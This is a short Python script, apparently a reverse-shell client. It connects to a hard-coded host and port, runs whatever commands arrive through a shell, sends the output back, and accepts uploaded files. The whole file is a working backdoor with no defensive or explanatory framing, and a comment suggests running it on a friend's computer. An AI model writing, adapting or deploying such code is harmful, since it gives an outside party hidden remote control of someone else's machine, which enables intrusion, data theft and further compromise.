# -*- coding: utf-8 -*-
"""
Created on Sun Jun 14 15:06:30 2020

@author: sumit
"""

import socket
import os
import subprocess

s = socket.socket()
host= "10.7.3.66"
port = 9999
s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd': 
        os.chdir(data[3:].decode("utf-8"))

    elif data[:4].decode("utf-8") == 'send':
        with open("recieved file", 'wb') as f:
            print('file opened')
            while True:
                print('receiving data...')
                data = s.recv(1024)
                print('data=%s', (data))
                if not data:
                    break
                # write data to a file
                f.write(data)
        print("File recieved")

    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read()+cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd()+"> "
        s.send(str.encode(output_str+currentWD))
#        print(output_str)#for friends computer
        
        
        